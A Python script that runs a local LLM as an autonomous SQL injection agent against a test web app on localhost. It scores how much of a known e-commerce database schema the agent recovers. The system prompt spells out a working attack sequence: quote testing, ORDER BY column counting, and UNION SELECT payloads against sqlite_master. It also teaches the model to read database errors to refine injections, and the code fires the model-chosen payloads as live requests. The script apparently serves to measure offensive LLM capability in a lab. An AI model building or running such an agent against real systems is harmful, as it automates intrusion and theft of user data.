import json, os, requests, argparse, time, random
from openai import OpenAI
from dotenv import load_dotenv
from pathlib import Path

load_dotenv()

TARGET = { "base_url": "http://localhost:8081" }

# ── LLM clients: API first, local fallback ────────────────────────────────────

def make_clients():
    """Local Ollama only"""
    client = OpenAI(
        base_url="http://localhost:11434/v1",
        api_key="ollama",
    )
    return client, "llama3.1:8b"

GROUND_TRUTH = {
    "tables": ["users", "products", "orders", "order_items", "reviews"],
    "columns": {
        "users":       ["id", "username", "email", "password_hash", "role", "created_at"],
        "products":    ["id", "name", "description", "price", "stock", "category", "created_at"],
        "orders":      ["id", "user_id", "total", "status", "shipping_address", "order_date"],
        "order_items": ["id", "order_id", "product_id", "quantity", "unit_price", "discount"],
        "reviews":     ["id", "user_id", "product_id", "rating", "body", "created_at"],
    },
}

# ── Step 1: Ask the AI to generate common e-commerce endpoints ────────────────

ENDPOINT_GEN_PROMPT = """You are a security researcher. 
Generate a list of exactly 10 common endpoints found in e-commerce REST APIs.
These should be realistic — the kind you'd find in a real online store backend.

Return ONLY this JSON, no extra text:
{
  "endpoints": [
    {"path": "/users",    "param": "id",      "example": "1"},
    {"path": "/products", "param": "id",      "example": "1"},
    ...8 more...
  ]
}

Rules:
- Each endpoint must have: path, param (the injectable query parameter), example (a normal value)
- Use realistic param names like id, user_id, product_id, name, email, order_id, etc.
- Cover these areas: users, products, orders, cart, reviews, categories, payments, search
"""

def generate_endpoints(client, model) -> list:
    print("Asking local LLM to generate endpoint list...")

    try:
        res = client.chat.completions.create(
            model=model,
            messages=[{"role": "user", "content": ENDPOINT_GEN_PROMPT}],
            temperature=0.3,
            max_tokens=800,
        )

        content = res.choices[0].message.content or ""

        # Safe JSON extraction
        try:
            endpoints = json.loads(content).get("endpoints", [])
        except:
            start = content.find("{")
            end   = content.rfind("}")
            if start != -1 and end != -1:
                endpoints = json.loads(content[start:end+1]).get("endpoints", [])
            else:
                print("Failed to parse endpoints JSON")
                print(content[:500])
                return []

        print(f"  [local] Generated {len(endpoints)} endpoints:")
        for ep in endpoints:
            print(f"    {ep['path']}?{ep['param']}={ep['example']}")

        return endpoints

    except Exception as e:
        print(f"  [local] Failed: {e}")
        return []


# ── Step 2: System prompt for the main agent ──────────────────────────────────

SYSTEM_PROMPT = """You are a SQL injection reconnaissance agent in authorized security research.
Your goal: infer the full SQLite schema by probing API endpoints and reading their responses.

═══ HOW TO READ ERROR MESSAGES ═══

When you get a 500 error, read it carefully — it tells you exactly what to do next:

  "no such table: X"
      → Table X does not exist. 
      → This endpoint IS injectable. Try a different table name.
      → Related endpoint hint: if X sounds like 'cart', try /cart or /baskets next.

  "no such column: X"  
      → Column X doesn't exist in this table.
      → You know the TABLE exists though — keep injecting this endpoint.
      → Try extracting columns via sqlite_master instead of guessing.

  "syntax error near X" or "unrecognized token"
      → The endpoint IS injectable — your SQL syntax just needs fixing.
      → Adjust the payload: check quote placement and comment terminator (--)

  "SELECTs to the left and right of UNION do not have same number of columns"
      → Add one more NULL to your UNION SELECT payload and retry same endpoint.

  "no such function" or "incomplete input"
      → Injection works but payload is malformed. Fix the SQL syntax.

When you get a 200 with data:
      → Read the JSON keys — those ARE column names. Add them to hypothesis immediately.
      → Count the fields — that tells you the column count for future UNION probes.

When you get a 500 with just "Internal server error" (no details):
      → This endpoint hides errors. Skip it, try another endpoint.

═══ HOW TO PICK THE NEXT ENDPOINT ═══

After each probe, ask: "what did this response hint at?"

  - Error mentions "order" or "transaction" → try /orders or /transactions next
  - Error mentions "user" or "account"      → try /users or /accounts next  
  - Error mentions "product" or "item"      → try /products or /items next
  - Got column names from a 200 response    → stay on this endpoint, go deeper
  - Got "no such table" on /browse          → the endpoint itself is still injectable, just wrong table name

═══ ATTACK SEQUENCE ═══

1. Test endpoint with 1' — if error mentions SQL → injectable
2. Find column count: 1' ORDER BY 1-- then 2-- then 3-- until error
3. Extract tables: 1' UNION SELECT group_concat(tbl_name),NULL,... FROM sqlite_master WHERE type='table'--
4. Extract columns: 1' UNION SELECT sql,NULL,... FROM sqlite_master WHERE name='tablename'--

═══ COLUMN TYPE & CONSTRAINT INFERENCE ═══

When extracting column definitions from sqlite_master:

- The "sql" field contains full CREATE TABLE statements.
- Parse BOTH column types AND constraints.

Example:
CREATE TABLE users (
  id INTEGER PRIMARY KEY,
  email TEXT NOT NULL,
  created_at DATETIME,
  role TEXT DEFAULT 'user'
)

→ Extract:
  id → INTEGER (PRIMARY KEY)
  email → TEXT (NOT NULL)
  created_at → DATETIME
  role → TEXT (DEFAULT)

Return structured format:
"columns": {
  "users": [
    {"name": "id", "type": "INTEGER", "constraints": ["PRIMARY KEY"]},
    {"name": "email", "type": "TEXT", "constraints": ["NOT NULL"]},
    {"name": "created_at", "type": "DATETIME", "constraints": []}
  ]
}

Rules:
- ALWAYS include "name"
- Include "type" if known, otherwise "UNKNOWN"
- Include "constraints" as a list (can be empty)
- Do NOT hallucinate — only extract from actual SQL


RESPOND ONLY IN THIS JSON FORMAT:
{
  "reasoning": "what the error/response revealed and WHY you picked the next endpoint",
  "new_findings": ["table: users", "col: email", "endpoint injectable: /users"],
  "related_endpoint_hint": "what the error message suggests about the next endpoint to try",
  "schema_hypothesis": {
    "tables": [],
    "columns": { "tablename": ["col1", "col2"] }
  },
  "next_probe": {
    "path": "/endpoint",
    "param": "param_name",
    "value": "payload",
    "description": "what this tests"
  }
}
"""


# ── HTTP probe ────────────────────────────────────────────────────────────────

def send_probe(path: str, param: str, value: str) -> dict:
    try:
        url = f"{TARGET['base_url']}{path}"
        r   = requests.get(url, params={param: value}, timeout=10)
        return {
            "path":        path,
            "param":       param,
            "value":       value,
            "status_code": r.status_code,
            "body":        r.text[:2000],
            "body_len":    len(r.text),
        }
    except Exception as e:
        return {"path": path, "param": param, "value": value, "error": str(e)}


# ── LLM call ─────────────────────────────────────────────────────────────────

def call_llm(client, model,
             history: list, hypothesis: dict, common_endpoints: list) -> dict:

    payload = {
        "available_endpoints": common_endpoints,
        "probe_history":       history[-8:],
        "current_hypothesis":  hypothesis,
    }

    messages = [
        {"role": "system", "content": SYSTEM_PROMPT},
        {"role": "user",   "content": json.dumps(payload)},
    ]

    try:
        res = client.chat.completions.create(
            model=model,
            messages=messages,
            temperature=0.1,
            max_tokens=1500,
        )

        content = res.choices[0].message.content or ""

        # Safe JSON parsing
        try:
            parsed = json.loads(content)
        except:
            start = content.find("{")
            end   = content.rfind("}")
            if start != -1 and end != -1:
                parsed = json.loads(content[start:end+1])
            else:
                print("\n  [local] Invalid JSON response")
                print(content[:500])
                return {}

        print("[local]", end=" ")
        return parsed

    except Exception as e:
        print(f"\n  [local] LLM error: {e}")
        return {}
# ── Metrics ───────────────────────────────────────────────────────────────────

def compute_metrics(h: dict) -> dict:
    """Compute accuracy metrics and return rich breakdown for display."""

    tables = [str(t).lower().strip() for t in h.get("tables", [])]
    cols_raw = h.get("columns", {})

    columns = {}
    for t, clist in cols_raw.items():
        t_clean = t.lower().strip()
        parsed_cols = []

        for c in (clist if isinstance(clist, list) else []):
            if isinstance(c, dict):
                parsed_cols.append({
                    "name": str(c.get("name", "")).lower(),
                    "type": str(c.get("type", "")).lower(),
                    "constraints": c.get("constraints", [])
                })
            else:
                parsed_cols.append({
                    "name": str(c).lower(),
                    "type": "",
                    "constraints": []
                })

        columns[t_clean] = parsed_cols

    h_clean = {"tables": tables, "columns": columns}

    gt_t  = set(GROUND_TRUTH["tables"])
    hyp_t = set(h_clean["tables"])
    found = gt_t & hyp_t
    trr   = len(found) / len(gt_t) if gt_t else 0

    # Column + type tracking
    table_col_detail = {}
    tg = tf = 0
    type_hits = 0
    type_total = 0

    for t in gt_t:
        gt_cols = set(GROUND_TRUTH["columns"][t])

        hyp_cols = h_clean["columns"].get(t, [])
        hyp_names = set(c["name"] for c in hyp_cols if c["name"])

        hits   = sorted(gt_cols & hyp_names)
        missed = sorted(gt_cols - hyp_names)

        tg += len(gt_cols)
        tf += len(hits)

        # Type tracking
        hyp_map = {c["name"]: c["type"] for c in hyp_cols}

        for col in gt_cols:
            type_total += 1
            if col in hyp_map and hyp_map[col]:
                type_hits += 1

        table_col_detail[t] = {
            "found":  hits,
            "missed": missed,
            "pct":    round(len(hits) / len(gt_cols) * 100) if gt_cols else 0,
        }

    crr = tf / tg if tg else 0
    type_acc = type_hits / type_total if type_total else 0

    return {
        "tables_pct":  round(trr * 100),
        "columns_pct": round(crr * 100),
        "types_pct":   round(type_acc * 100),
        "score_pct":   round((0.4 * trr + 0.6 * crr) * 100),

        "tables_found":  sorted(found),
        "tables_missed": sorted(gt_t - hyp_t),
        "tables_total":  len(gt_t),

        "columns_found": tf,
        "columns_total": tg,

        "types_found": type_hits,
        "types_total": type_total,

        "per_table": table_col_detail,

        "TRR": round(trr, 4),
        "CRR": round(crr, 4),
    }
def print_metrics(m: dict, probe_num: int, mode: str = "inline"):
    """
    mode='inline'  → compact single line printed during the loop
    mode='full'    → detailed breakdown printed at the end
    """
    if mode == "inline":
        tables_str  = f"{len(m['tables_found'])}/{m['tables_total']}"
        columns_str = f"{m['columns_found']}/{m['columns_total']}"
        print(
            f"  Tables: {m['tables_pct']}% ({tables_str})  "
            f"Columns: {m['columns_pct']}%  ({columns_str})  "
            f"Score: {m['score_pct']}%"
        )

    elif mode == "full":
        total_w = 58
        print(f"\n{'='*total_w}")
        print(f"  RESULTS AFTER {probe_num} PROBES")
        print(f"{'='*total_w}")
        print(f"  Tables found : {m['tables_pct']}%  "
              f"({len(m['tables_found'])} of {m['tables_total']})")
        print(f"  Columns found: {m['columns_pct']}%  "
              f"({m['columns_found']} of {m['columns_total']})")
        print(f"  Overall score: {m['score_pct']}%")
        print(f"{'-'*total_w}")

        # Per-table column breakdown
        print(f"  COLUMN DETAIL:\n")
        for table in sorted(GROUND_TRUTH["tables"]):
            detail    = m["per_table"][table]
            found_tag = "✓" if table in m["tables_found"] else "✗"
            print(f"  {found_tag} {table}  ({detail['pct']}% of columns)")

            if detail["found"]:
                cols = ", ".join(detail["found"])
                print(f"      Found  : {cols}")
            else:
                print(f"      Found  : (none yet)")

            if detail["missed"]:
                cols = ", ".join(detail["missed"])
                print(f"      Missing: {cols}")

            print()

        if m["tables_missed"]:
            print(f"  Tables not found yet: {', '.join(m['tables_missed'])}")
        print(f"{'='*total_w}\n")


# ── Main agent loop ───────────────────────────────────────────────────────────

def run_agent(max_probes: int = 60):
    client, model = make_clients()

    # ── Phase 0: AI generates the endpoint list ───────────────────────────────
    common_endpoints = generate_endpoints(client, model)
    if not common_endpoints:
        print("Failed to generate endpoints. Exiting.")
        return

    history    = []
    hypothesis = {"tables": [], "columns": {}}
    stagnation = 0
    tried      = set()   # track path+param+value combos already sent

    # Start with the first generated endpoint + a quote to test for injection
    first_ep = common_endpoints[0]
    path     = first_ep["path"]
    param    = first_ep["param"]
    value    = f"{first_ep['example']}'"

    print(f"\n{'='*60}")
    print(f"  Recon Agent starting — {len(common_endpoints)} endpoints to explore")
    print(f"{'='*60}\n")

    for n in range(1, max_probes + 1):
        probe_key = f"{path}:{param}:{value}"

        # Skip if we've sent this exact probe before
        if probe_key in tried:
            ep    = random.choice(common_endpoints)
            path  = ep["path"]
            param = ep["param"]
            value = f"{ep['example']}'"
            print(f"[{n:02d}] Skipping duplicate, random pick: {path}")
            continue

        tried.add(probe_key)
        print(f"[{n:02d}] {path}?{param}={value!r}", end="  ")

        # ── Send probe ────────────────────────────────────────────────────────
        resp = send_probe(path, param, value)
        history.append({
            "probe_num": n,
            "probe":     {"path": path, "param": param, "value": value},
            "response":  resp,
        })

        # ── Ask LLM to analyze response and pick next probe ───────────────────
        prev_tables = set(hypothesis.get("tables", []))
        llm = call_llm(client, model, history, hypothesis, common_endpoints=common_endpoints)

        if not llm:
            stagnation += 1
            # Fallback: random endpoint from the AI-generated list
            ep    = random.choice(common_endpoints)
            path  = ep["path"]
            param = ep["param"]
            value = f"{ep['example']}'"
            print(f"(LLM failed) → random fallback: {path}")
            continue

        hypothesis  = llm.get("schema_hypothesis", hypothesis)
        new_tables  = set(hypothesis.get("tables", []))
        new_findings = llm.get("new_findings", [])
        hint        = llm.get("related_endpoint_hint", "")

        # Stagnation tracking
        stagnation = 0 if new_tables != prev_tables else stagnation + 1

        # Metrics
        m = compute_metrics(hypothesis)
        print_metrics(m, n, mode="inline")

        if new_findings:
            print(f"  ↳ Found: {new_findings}")
        if hint:
            print(f"  ↳ Hint:  {hint}")

        # ── Stopping condition ────────────────────────────────────────────────
        if m["TRR"] >= 0.9 and m["CRR"] >= 0.8:
            print("\n  Schema fully inferred!")
            break

        # ── Next probe decision ───────────────────────────────────────────────
        if stagnation >= 5:
            # FALLBACK: random pick from AI-generated endpoint list
            ep    = random.choice(common_endpoints)
            path  = ep["path"]
            param = ep["param"]
            value = f"{ep['example']}'"
            stagnation = 0
            print(f"  ⚡ Fallback → random endpoint: {path}")
        else:
            # Follow LLM's suggestion
            nxt   = llm.get("next_probe", {})
            path  = nxt.get("path",  path)
            param = nxt.get("param", param)
            value = nxt.get("value", value)
            desc  = nxt.get("description", "")
            if desc:
                print(f"  → {desc}")

        time.sleep(0.3)

    # ── Save results ──────────────────────────────────────────────────────────
    final = compute_metrics(hypothesis)
    print_metrics(final, len(history), mode="full")

    Path("results").mkdir(exist_ok=True)
    out = Path("results") / f"run_{int(time.time())}.json"
    with open(out, "w") as f:
        json.dump({
            "generated_endpoints": common_endpoints,
            "hypothesis":          hypothesis,
            "final_metrics":       final,
            "probe_history":       history,
        }, f, indent=2)
    print(f"Saved → {out}")


if __name__ == "__main__":
    parser = argparse.ArgumentParser()
    parser.add_argument("--max-probes", type=int, default=60)
    args = parser.parse_args()
    run_agent(args.max_probes)